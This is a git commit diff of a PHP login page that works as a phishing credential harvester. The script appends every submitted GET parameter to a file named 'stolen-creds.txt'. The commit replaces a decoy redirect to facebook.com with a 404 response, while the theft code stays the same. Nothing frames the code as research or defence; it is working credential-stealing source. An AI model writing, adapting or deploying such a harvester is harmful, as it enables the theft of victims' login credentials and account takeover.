55f793b49348e0556f1c27261f7ab44c8fd216d7
Ofek Vardi <ofekvar1@gmail.com>
2022-05-14 18:04:41 +0300

    Redirect user to 404 page

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-	header ("Location: http://facebook.com ");
+	header('HTTP/1.0 404 Not Found');
 	$handle = fopen("stolen-creds.txt", "a")
 	foreach($_GET as $variable => $value) {
 		fwrite($handle, "$variable=$value\n");
